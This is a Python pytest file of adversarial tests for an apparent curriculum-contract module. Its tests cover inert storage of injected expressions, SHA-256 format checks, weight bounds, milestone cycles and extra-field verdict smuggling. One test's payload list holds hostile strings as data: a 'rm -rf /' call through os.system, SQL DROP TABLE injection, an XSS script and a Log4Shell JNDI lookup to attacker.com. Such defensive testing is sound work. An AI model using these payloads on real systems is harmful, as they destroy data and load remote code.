"""Adversarial and boundary stress tests for S5.4 Curriculum Contracts.

Vectors:
1. Malicious code injection via Hoare formal expressions.
2. Non-average bypass attempts (compensating critical dimensions).
3. Complex indirect cyclic milestone dependency injection.
4. SHA-256 digest forgery and format corruption.
5. Weight arithmetic boundary exploits (NaN, Inf, precision drift).
6. Extra field injection attempts to smuggle mastery verdicts.
"""

from datetime import datetime, timezone
import pytest
from pydantic import ValidationError

from study_engine.curriculum import (
    ArtifactProvenance,
    ArtifactRecord,
    ArtifactType,
    GatewayAttemptRecord,
    GatewayDefinition,
    GatewayFormat,
    GatewayVerdictCriteria,
    Invariant,
    ProjectMilestone,
    ProjectSpecification,
    RubricDimension,
)


def test_adversarial_hoare_injection_payloads_remain_inert() -> None:
    """Adversarial injection: Shell/python payloads in formal expressions."""
    dangerous_payloads = [
        "__import__('os').system('rm -rf /')",
        "eval(compile('1+1', '', 'eval'))",
        "exec('import sys; sys.exit(1)')",
        "; DROP TABLE student_mastery; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://attacker.com/a}",
    ]

    for payload in dangerous_payloads:
        inv = Invariant(
            invariant_id="inv-adv",
            formal_expression=payload,
            description="Adversarial expression test",
            violation_consequence="Impact test",
        )
        # Content is preserved literally as static data
        assert inv.formal_expression == payload
        # No side-effects or execution capability
        assert not callable(inv)
        assert not hasattr(inv, "evaluate")


def test_adversarial_sha256_forgery_and_format_corruption() -> None:
    """Adversarial digest attacks: Uppercase hex, non-hex, bad length."""
    now = datetime.now(timezone.utc)
    prov = ArtifactProvenance(
        source_lab_id="lab-01",
        tool_name="tool",
        captured_at=now,
    )

    invalid_hashes = [
        "A" * 64,  # Uppercase hex rejected (lowercase required)
        "z" * 64,  # Non-hex characters
        "a" * 63,  # Truncated (63 chars)
        "a" * 65,  # Extended (65 chars)
        "",        # Empty
        "0x" + "a" * 62,  # Prefixed hex
        "NaN",
    ]

    for bad_hash in invalid_hashes:
        with pytest.raises(ValidationError):
            ArtifactRecord(
                artifact_id="art-adv",
                sha256=bad_hash,
                artifact_type=ArtifactType.PCAP_CAPTURE,
                filename="test.pcap",
                size_bytes=100,
                mime_type="application/vnd.tcpdump.pcap",
                provenance=prov,
            )


def test_adversarial_rubric_weight_exploits() -> None:
    """Boundary attacks: NaN, Inf, negative, zero float weights."""
    with pytest.raises(ValidationError):
        RubricDimension(dimension_id="d1", title="D1", weight=float("nan"))

    with pytest.raises(ValidationError):
        RubricDimension(dimension_id="d1", title="D1", weight=float("inf"))

    with pytest.raises(ValidationError):
        RubricDimension(dimension_id="d1", title="D1", weight=-0.5)

    with pytest.raises(ValidationError):
        RubricDimension(dimension_id="d1", title="D1", weight=0.0)


def test_adversarial_complex_indirect_cyclic_milestones() -> None:
    """Adversarial graph attack: 5-node indirect cycle (A->B->C->D->E->A)."""
    m_a = ProjectMilestone(
        milestone_id="m-a",
        project_id="P-ADV",
        sequence_order=0,
        title="MA",
        description="DA",
        prerequisite_milestone_ids=("m-e",),  # Cycle back from E
    )
    m_b = ProjectMilestone(
        milestone_id="m-b",
        project_id="P-ADV",
        sequence_order=1,
        title="MB",
        description="DB",
        prerequisite_milestone_ids=("m-a",),
    )
    m_c = ProjectMilestone(
        milestone_id="m-c",
        project_id="P-ADV",
        sequence_order=2,
        title="MC",
        description="DC",
        prerequisite_milestone_ids=("m-b",),
    )
    m_d = ProjectMilestone(
        milestone_id="m-d",
        project_id="P-ADV",
        sequence_order=3,
        title="MD",
        description="DD",
        prerequisite_milestone_ids=("m-c",),
    )
    m_e = ProjectMilestone(
        milestone_id="m-e",
        project_id="P-ADV",
        sequence_order=4,
        title="ME",
        description="DE",
        prerequisite_milestone_ids=("m-d",),
    )

    with pytest.raises(ValidationError, match="Cyclic milestone dependency"):
        ProjectSpecification(
            project_id="P-ADV",
            title="Adversarial Cyclic Project",
            curriculum_node_id="node-adv",
            milestones=(m_a, m_b, m_c, m_d, m_e),
        )


def test_adversarial_verdict_smuggling_into_contracts() -> None:
    """Adversarial authority attack: Smuggle mastery claims or verdicts."""
    now = datetime.now(timezone.utc)
    prov = ArtifactProvenance(
        source_lab_id="lab-01",
        tool_name="tool",
        captured_at=now,
    )

    # Attempt to smuggle verdict into ArtifactRecord
    with pytest.raises(ValidationError):
        ArtifactRecord(
            artifact_id="art-smuggle",
            sha256="a" * 64,
            artifact_type=ArtifactType.LOG_BUNDLE,
            filename="log.txt",
            size_bytes=100,
            mime_type="text/plain",
            provenance=prov,
            student_verdict="PASSED_GATEWAY",  # type: ignore[call-arg]
        )

    # Attempt to smuggle verdict into GatewayAttemptRecord
    with pytest.raises(ValidationError):
        GatewayAttemptRecord(
            attempt_id="att-smuggle",
            gateway_id="G0.1",
            student_id="student-1",
            started_at=now,
            is_approved=True,  # type: ignore[call-arg]
        )

    # Attempt to smuggle verdict into GatewayDefinition
    with pytest.raises(ValidationError):
        GatewayDefinition(
            gateway_id="G0.1",
            curriculum_node_id="node-01",
            title="G0.1",
            format=GatewayFormat.INDIVIDUAL_PRACTICAL,
            rubric_id="rubric-01",
            verdict_criteria=GatewayVerdictCriteria(criteria_id="c1"),
            final_grade="A+",  # type: ignore[call-arg]
        )
